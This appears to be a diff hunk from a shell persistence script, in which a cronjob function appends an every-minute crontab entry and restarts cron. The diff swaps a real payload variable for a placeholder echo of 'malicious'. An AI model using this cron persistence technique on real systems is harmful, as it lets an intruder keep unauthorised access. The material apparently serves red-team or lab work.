@@ -144,7 +144,7 @@ alias_ls(){
 cronjob(){
     echo -e "\nInstalling cronjob... \n"
 
-    crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
+    crontab -l | { cat; echo "* * * * * echo 'maliciousmaliciousmalicious'"; } | crontab -
     systemctl restart cron 
     systemctl restart crond
 
